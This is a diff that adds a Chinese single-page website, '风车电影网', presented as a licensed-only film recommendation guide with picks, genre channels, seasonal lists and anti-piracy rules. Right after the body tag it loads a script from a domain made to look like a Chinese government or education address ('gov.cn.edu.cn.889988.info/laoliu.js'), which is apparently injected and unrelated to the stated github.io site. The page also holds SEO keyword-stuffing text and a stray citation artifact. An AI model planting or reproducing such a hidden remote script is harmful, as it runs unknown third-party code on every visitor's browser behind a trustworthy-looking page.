@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>风车电影网 - 田园风车片单与正版观影导航</title>
+<meta name="description" content="风车电影网（fengchedianyingwang-h5）做田园转片导航：风车精选片单、风道类型分发、四季放映日历与正版观看守则。官方网址：https://fengchedianyingwang-h5.github.io">
+<meta name="keywords" content="风车电影网, fengchedianyingwang-h5, 田园电影推荐, 风车片单, 类型风道, 正版观影导航">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#f3fbff;color:#143055;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 320px at 10% 6%, rgba(34,197,94,.14), transparent 55%),
+    radial-gradient(620px 300px at 90% 94%, rgba(37,99,235,.10), transparent 55%),
+    #f3fbff}
+.fc-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(243,251,255,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(20,48,85,.12)}
+.fc-nav .logo{font-size:20px;font-weight:900;letter-spacing:1px}
+.fc-nav .logo b{color:#e11d48}
+.fc-nav .logo i{color:#16a34a;font-style:normal}
+.fc-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.fc-nav .links a{font-size:13px;color:#33506e;padding:6px 12px;border-radius:20px;transition:.25s}
+.fc-nav .links a:hover{background:rgba(34,197,94,.16);color:#143055}
+
+.hero{padding:54px 20px 42px;text-align:center}
+.mill{position:relative;width:160px;height:160px;margin:0 auto 10px}
+.blades{position:absolute;inset:0;animation:spin 7s linear infinite;transform-origin:center}
+.blades span{position:absolute;left:50%;top:50%;width:0;height:0;border-style:solid;transform-origin:0 0}
+.blades .b1{margin-left:0;margin-top:0;border-width:0 26px 78px 26px;border-color:transparent transparent #e11d48 transparent;transform:rotate(0deg) translate(0,-78px)}
+.blades .b2{margin-left:0;margin-top:0;border-width:0 26px 78px 26px;border-color:transparent transparent #facc15 transparent;transform:rotate(90deg) translate(0,-78px)}
+.blades .b3{margin-left:0;margin-top:0;border-width:0 26px 78px 26px;border-color:transparent transparent #16a34a transparent;transform:rotate(180deg) translate(0,-78px)}
+.blades .b4{margin-left:0;margin-top:0;border-width:0 26px 78px 26px;border-color:transparent transparent #2563eb transparent;transform:rotate(270deg) translate(0,-78px)}
+.hub{position:absolute;left:50%;top:50%;width:26px;height:26px;margin:-13px 0 0 -13px;border-radius:50%;background:#143055;z-index:2}
+.pole{width:8px;height:46px;background:#8a5a2b;margin:0 auto;border-radius:6px}
+@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+.wind-tags{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin:10px auto 14px}
+.wind-tags span{font-size:12px;color:#143055;padding:5px 13px;border-radius:20px;border:1px solid rgba(20,48,85,.18)}
+.wind-tags span:nth-child(1){border-color:#e11d48;color:#9f1239}
+.wind-tags span:nth-child(2){border-color:#16a34a;color:#14532d}
+.wind-tags span:nth-child(3){border-color:#2563eb;color:#1e3a8a}
+.hero h1{font-size:30px;color:#143055;margin:6px 0 12px}
+.hero h1 b{color:#e11d48}
+.hero p{color:#33506e;max-width:660px;margin:0 auto 16px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#fff;font-weight:800;background:linear-gradient(90deg,#143055,#16a34a);padding:8px 18px;border-radius:30px}
+
+.wrap{max-width:1160px;margin:0 auto;padding:60px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#15803d;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#143055;margin-bottom:28px}
+.sec-title b{color:#e11d48}
+
+/* 风车片单 */
+.picks{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.pick{background:#fff;border:1px solid rgba(20,48,85,.1);border-radius:14px;overflow:hidden;transition:.3s}
+.pick:hover{transform:translateY(-4px);border-color:#16a34a;box-shadow:0 16px 36px rgba(34,197,94,.12)}
+.pick .cv{height:118px;position:relative}
+.pick .cv.p1{background:linear-gradient(135deg,#143055,#2563eb)}
+.pick .cv.p2{background:linear-gradient(135deg,#14532d,#16a34a)}
+.pick .cv.p3{background:linear-gradient(135deg,#78350f,#facc15)}
+.pick .cv.p4{background:linear-gradient(135deg,#9f1239,#fb7185)}
+.pick .cv .wind{position:absolute;left:12px;bottom:12px;font-size:11px;font-weight:800;color:#143055;background:#fff;padding:3px 10px;border-radius:20px}
+.pick .cv .len{position:absolute;right:12px;top:12px;font-size:11px;color:#fff;background:rgba(0,0,0,.4);padding:2px 8px;border-radius:12px}
+.pick .body{padding:16px 18px}
+.pick .body h4{color:#143055;font-size:16px;margin-bottom:4px}
+.pick .body .meta{font-size:12px;color:#15803d;margin-bottom:6px}
+.pick .body p{font-size:13px;color:#33506e;margin:0}
+
+/* 风道类型 */
+.winds{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.wind-card{background:#fff;border:1px solid rgba(37,99,235,.16);border-radius:14px;padding:20px;transition:.3s}
+.wind-card:hover{border-color:#16a34a}
+.wind-card .ic{font-size:22px;margin-bottom:8px}
+.wind-card h4{color:#143055;font-size:15px;margin-bottom:4px}
+.wind-card p{color:#33506e;font-size:12px;margin:0}
+.wind-card.w1{border-top:3px solid #e11d48}
+.wind-card.w2{border-top:3px solid #16a34a}
+.wind-card.w3{border-top:3px solid #2563eb}
+.wind-card.w4{border-top:3px solid #facc15}
+
+/* 四季放映 */
+.seasons{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+.season{background:#fff;border-left:4px solid #16a34a;border-radius:12px;padding:20px}
+.season h4{color:#143055;font-size:16px;margin-bottom:6px}
+.season .tag{font-size:12px;color:#e11d48;font-weight:800;margin-bottom:6px}
+.season p{color:#33506e;font-size:13px;margin:0}
+.season.s2{border-left-color:#2563eb}
+.season.s3{border-left-color:#facc15}
+.season.s4{border-left-color:#e11d48}
+
+/* 正版守则 */
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.rule{background:#fff;border:1px solid rgba(34,197,94,.22);border-radius:12px;padding:18px;text-align:center}
+.rule .num{font-size:24px;font-weight:900;color:#16a34a;margin-bottom:6px}
+.rule h4{color:#143055;font-size:14px;margin-bottom:4px}
+.rule p{color:#33506e;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(34,197,94,.24);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(34,197,94,.08),rgba(37,99,235,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#143055;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#e11d48}
+.about p{color:#33506e;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#16a34a}
+.about .stats .l{font-size:11px;color:#15803d}
+
+.foot{text-align:center;padding:32px 20px;background:#e8f4fb;border-top:1px solid rgba(20,48,85,.12);color:#5b748f;font-size:13px}
+.foot a{color:#16a34a}
+.foot .lg{font-size:18px;font-weight:900;color:#143055;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.fc-nav .links a{font-size:12px;padding:5px 9px}.mill{width:140px;height:140px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="fc-nav">
+  <div class="logo"><b>风车</b>电影网 <i>· 田园转片</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#picks">风车片单</a>
+    <a href="#winds">风道类型</a>
+    <a href="#seasons">四季放映</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="mill">
+    <div class="blades">
+      <span class="b1"></span><span class="b2"></span><span class="b3"></span><span class="b4"></span>
+    </div>
+    <div class="hub"></div>
+  </div>
+  <div class="pole"></div>
+  <div class="wind-tags">
+    <span>🍃 轻松风</span><span>🌪️ 烧脑风</span><span>☀️ 合家风</span>
+  </div>
+  <h1>风车电影网：<b>看风向转片</b>，不刷首页撞大运</h1>
+  <p>按心情当风向、按类型当风道、按四季当放映日历——田园式整理电影。本站不提供未授权在线播放、不写网盘提取码、不引盗版镜像，只导航公映/持牌/开放授权片源。</p>
+  <span class="url">🌐 https://fengchedianyingwang-h5.github.io</span>
+</header>
+
+<main>
+<section id="picks" class="wrap">
+  <div class="kicker">WINDMILL PICKS</div>
+  <h2 class="sec-title">风车片单 <b>四叶精选</b></h2>
+  <div class="picks">
+    <article class="pick"><div class="cv p1"><span class="wind">轻松风·蓝叶</span><span class="len">142分钟</span></div><div class="body"><h4>海蒂和爷爷</h4><div class="meta">阿兰·葛斯彭纳 · 2015 · 田园/家庭</div><p>阿尔卑斯、牧场与祖孙关系，风车站当作“轻松风”样板，正版合家专区易找。</p></div></article>
+    <article class="pick"><div class="cv p2"><span class="wind">自然风·绿叶</span><span class="len">纪录片</span></div><div class="body"><h4>植物私生活</h4><div class="meta">BBC · 1995 · 自然/科教</div><p>延时摄影讲植物生长，适合四季放映的春夏季自然档，开放授权版可走图书馆影像。</p></div></article>
+    <article class="pick"><div class="cv p3"><span class="wind">烧脑风·黄叶</span><span class="len">113分钟</span></div><div class="body"><h4>记忆碎片</h4><div class="meta">诺兰 · 2000 · 悬疑/心理</div><p>逆向叙事、笔记与线索，归“烧脑风”风道；正版平台标高清/导演剪辑版差异。</p></div></article>
+    <article class="pick"><div class="cv p4"><span class="wind">合家风·红叶</span><span class="len">95分钟</span></div><div class="body"><h4>天空之城</h4><div class="meta">宫崎骏 · 1986 · 动画/冒险</div><p>浮岛、风车、飞行与童趣，红叶合家档常备，适龄低、正版动画专区稳定。</p></div></article>
+  </div>
+</section>
+
+<section id="winds" class="wrap">
+  <div class="kicker">WIND CHANNELS</div>
+  <h2 class="sec-title">风道类型 <b>四股风</b></h2>
+  <div class="winds">
+    <div class="wind-card w1"><div class="ic">🍃</div><h4>轻松田园风</h4><p>治愈、农场、慢生活、轻喜剧；按低冲突、低悬疑做合家/独处分流。</p></div>
+    <div class="wind-card w2"><div class="ic">🌿</div><h4>自然科教风</h4><p>纪录片、生态、动植物、地理；标4K/延时/微距版本与开放授权来源。</p></div>
+    <div class="wind-card w3"><div class="ic">🌪️</div><h4>悬疑烧脑风</h4><p>本格、社会派、心理、时间线；按反转密度与叙事结构建风道标签。</p></div>
+    <div class="wind-card w4"><div class="ic">☀️</div><h4>合家动画风</h4><p>成长、奇幻、亲子、节庆；标适龄、时长与正版儿童/家庭专区入口。</p></div>
+  </div>
+</section>
+
+<section id="seasons" class="wrap">
+  <div class="kicker">SEASON SCREENING</div>
+  <h2 class="sec-title">四季放映 <b>四档</b></h2>
+  <div class="seasons">
+    <div class="season"><div class="tag">春 · 生长</div><h4>自然与新片</h4><p>纪录片、田园片、院线新定档；按公映许可与持牌平台上新做春播片单。</p></div>
+    <div class="season s2"><div class="tag">夏 · 长日</div><h4>动画与合家</h4><p>动画马拉松、亲子专场、轻喜剧；优先正版家庭专区，标注常温/空调观影时长。</p></div>
+    <div class="season s3"><div class="tag">秋 · 沉淀</div><h4>剧情与传记</h4><p>历史、人物、作者电影、高分修复；适合写观后、做小组放映与教学样例。</p></div>
+    <div class="season s4"><div class="tag">冬 · 围炉</div><h4>悬疑与经典</h4><p>烧脑推理加老片重看，风车转慢一点；正版平台标修复版、导演剪辑与字幕来源。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">WINDMILL RULES</div>
+  <h2 class="sec-title">正版观看 <b>守则</b></h2>
+  <div class="rules">
+    <div class="rule"><div class="num">01</div><h4>持牌优先</h4><p>引导持证视频平台、影院重映、官方频道；不内嵌未授权播放器。</p></div>
+    <div class="rule"><div class="num">02</div><h4>公映/授权</h4><p>境内外影片按公映许可、信息网络传播授权核对，不列无资质片源。</p></div>
+    <div class="rule"><div class="num">03</div><h4>开放授权</h4><p>老片修复、纪录片、公有领域片可引图书馆/开放档案，不提供破解文件。</p></div>
+    <div class="rule"><div class="num">04</div><h4>不碰盗版</h4><p>不写网盘提取码、不引磁链/镜像、不用“福利/成人/理论片”暗语分类。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>风车电影网 <b>是什么</b></h2>
+      <p>不是“风车影院”式在线盗版站，而是一张田园转片导航图：风车四叶对应轻松/自然/烧脑/合家，风道对应类型，四季对应长线片单。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。[8](@ref)</p>
+      <p>长尾吃「田园电影推荐 / 风车片单 / 类型风道 / 四季放映日历 / 正版平台看片」。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">4</div><div class="l">风车叶片</div></div>
+      <div><div class="n">4</div><div class="l">类型风道</div></div>
+      <div><div class="n">4</div><div class="l">四季档期</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">🎡 风车电影网</div>
+  官方网址：<a href="https://fengchedianyingwang-h5.github.io">https://fengchedianyingwang-h5.github.io</a><br>
+  © 2026 风车电影网｜风车片单 / 类型风道 / 四季放映 / 正版观影导航
+</footer>
+
+</body>
+</html>
